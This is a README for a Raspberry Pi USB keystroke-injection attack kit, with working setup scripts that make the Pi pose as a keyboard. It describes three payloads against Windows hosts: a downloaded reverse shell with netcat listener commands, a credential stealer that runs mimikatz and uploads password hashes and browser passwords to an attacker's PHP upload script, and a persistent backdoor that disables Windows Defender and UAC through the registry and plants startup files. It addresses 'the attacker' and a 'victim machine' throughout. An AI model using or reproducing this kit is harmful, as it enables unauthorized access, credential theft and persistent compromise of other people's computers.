## Keystroke Injection

IP and PORT must be changed for both retrieve of the PowerShell script and reverse shell.

As many payloads could be saved, just ensure to either comment out (#) the imports or have one import importing the specific payload.



## Setup

Commands:

    echo "dtoverlay=dwc2" | sudo tee -a /boot/config.txt
    echo "dwc2" | sudo tee -a /etc/modules
    sudo echo "libcomposite" | sudo tee -a /etc/modules

    sudo touch /usr/bin/isticktoit_usb
    sudo chmod +x /usr/bin/isticktoit_usb
    sudo nano /etc/rc.local

Add the following before the line containing exit 0:

    /usr/bin/isticktoit_usb # libcomposite configuration

Execute the first command and then paste the next block:
    
    sudo nano /usr/bin/isticktoit_usb
 
Paste:

    #!/bin/bash
    cd /sys/kernel/config/usb_gadget/
    mkdir -p isticktoit
    cd isticktoit
    echo 0x1d6b > idVendor # Linux Foundation
    echo 0x0104 > idProduct # Multifunction Composite Gadget
    echo 0x0100 > bcdDevice # v1.0.0
    echo 0x0200 > bcdUSB # USB2
    mkdir -p strings/0x409
    echo "fedcba9876543210" > strings/0x409/serialnumber
    echo "Tobias Girstmair" > strings/0x409/manufacturer
    echo "iSticktoit.net USB Device" > strings/0x409/product
    mkdir -p configs/c.1/strings/0x409
    echo "Config 1: ECM network" > configs/c.1/strings/0x409/configuration
    echo 250 > configs/c.1/MaxPower

    # Add functions here
    mkdir -p functions/hid.usb0
    echo 1 > functions/hid.usb0/protocol
    echo 1 > functions/hid.usb0/subclass
    echo 8 > functions/hid.usb0/report_length
    echo -ne \\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0 > functions/hid.usb0/report_desc
    ln -s functions/hid.usb0 configs/c.1/
    # End functions

    ls /sys/class/udc > UDC''


Now create a python script somewhere suitable and this couple of lines are the most important aspect of all the payloads:

    #!/usr/bin/env python3
    NULL_CHAR = chr(0)

    def write_report(report):
        with open('/dev/hidg0', 'rb+') as fd:
            fd.write(report.encode())


To make it auto start on boot up:

    sudo nano /etc/rc.local

Then add the following before the line containing exit 0:

    /home/root/(name_of_file.py)      #path_of_your_script.py



DONE!!!!



## Useful Links

USB HID TABLE
    https://usb.org/sites/default/files/documents/hut1_12v2.pdf

Raspberry pi HID tutorial
    https://randomnerdtutorials.com/raspberry-pi-zero-usb-keyboard-hid/

Reverse shells
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

Powershell commands
    https://blog.geoda-security.com/2019/03/reverse-shell-in-memory-utilizing.html



## Payload 1
For the first main payload, Reverse Shell Payload, the attacker must have a file server with the PowerShell located in it with the IP and PORT pointing to the listening/attacker computer (probably it self).
The simples and fastest way is to start a python server with this commands:

    Python 2.x : python -m SimpleHTTPServe 8000

    Python 3.x : python3 -m http.server 8000

    Php : php -S 0.0.0.0:8000

Ensure that the port is the same in the payload.

The reverse shell can be easily started with netcat with this command

    nc -lvp 4040

Ensuring that the port is the same as the on in the PowerShell script.

Once all this is setup, the Keystroke Injection could be executed taking an average of 1 minute to complete and get a reverse shell!


Explaining the Payload:

This payload opens the 'Run' Box in windows with \RUNBOX then injects the code to download the reverse shell form the file server and execute it.
It then executes that command by running it with admin privileges, with \ADMINPRESS, and handles the window with \LEFTARROW and \ENTER.

The reverse shell is then downloaded and executed and run in the background seamlessly.



## Payload 2
For the second payload, Password Stealer Payload, will steal windows NTLM password hashes to be cracked and browser passwords.

For a main recovery of the password hashes a php server must be deployed with a file to handle the upload of the files containing the passwords.

You can copy the 'server' folder in /payload2/ directory that ahs everything set up, or you can do the following to set it up manually.

To set up the server on the in linux, go to a directory and:

    nano upload.php

Paste this in:

    <?php
    $file = date("H-i-s-m") . ".zip";
    file_put_contents($file, file_get_contents("php://input"));
    ?>

To start the server:

    php -S 0.0.0.0:8000

Additionally, the server root directory must contain both versions of mimikatz with filenames with mimikatz64.exe and mimikatz32.exe as well as a command supported version of WebBrowserPassViewer.exe names webpass.exe


##Explaining the payload:

This payload opens the 'Run' Box in windows with \RUNBOX and sends keystrokes to start PowerShell.
It then executes that command by running it with admin privileges, with \ADMINPRESS, and handles the window with \LEFTARROW and \ENTER.
Once PowerShell is launched, all the code is injected in one line.

The code first downloads both versions of mimkatz from the Php server, it then runs them both and dumps the output into a file and both files are then uploaded to the Php server and finally all files are deleted and the PowerShell windows is closed.

Notes:
    All files are downloaded to the root of the C:\ drive.
    PHP server must be on before execution, otherwise script will run as normal but will not download or upload files.

    This could be done so much cleaner and simpler with less code!!! (i will be working on that)


## Payload 3
This third payload, Persistent Reverse Shell, will provide persistent backdoor access to a victim machine even after reboot.

To set up,the attacker machine must have a webserver, easily done with the following command;

    php -S 0.0.0.0:8000

This webserver must have the following three files in the root directory;

    payload3.ps1
    run.exe
    run.ps1

To allow our reverse shell script to be executed with admin privileges, it disables the Integrated Windows Defender Antivirus and removes the User Access Control. This ensures that the machine does not detect the payload and that the payload is run with admin privileges without a prompt. 

After manually disabling Windows Defender, it opens a run box with admin privileges that adds three entries to Registry.
The entries do the following;

First entry disables the User Access Control.
Second entry allows PowerShell scripts to be executed.
Third entry disables Windows Defender.

We enable PowerShell scripts to be run as our payload is in a PowerShell script which must be run at start up.

Windows Defender is disabled in the registry to ensure it doesn't go back on as Windows actively tries to turn it back on even when turned off manually.

Next, another window is opened to download the necessary scripts into the right folders.

The 'payload3.ps1' is downloaded in the System32 folder
The 'run.ps1' is downloaded in the System32 folder
The 'run.exe' is downloaded in the Start Up folder.

The run.ps1 file just re executed and adds the previous entries. This is done to ensure that they remain the same even after an update or if they are every turned back to the original state automatically.

The run.exe is a small .cpp script that I left with the rest of the files that just executes both of the .ps1 scripts with an added timer.

The timer, or sleep function, can be incremented by editing the .cpp file and recompiling it.

If you edit the .cpp file, increasing the timer will execute the reverse shell after that amount of time to reconnect back to the attacker machine. The amount of times it happens can also be incremented in the loop.

HOWEVER, every time it runs PowerShell windows will popup for less than a second so make sure to extend the time.

Notes:

    This works assuming no third party antivirus is installed
    If the user logs in too quick the powrshell windows will be seen momentarily


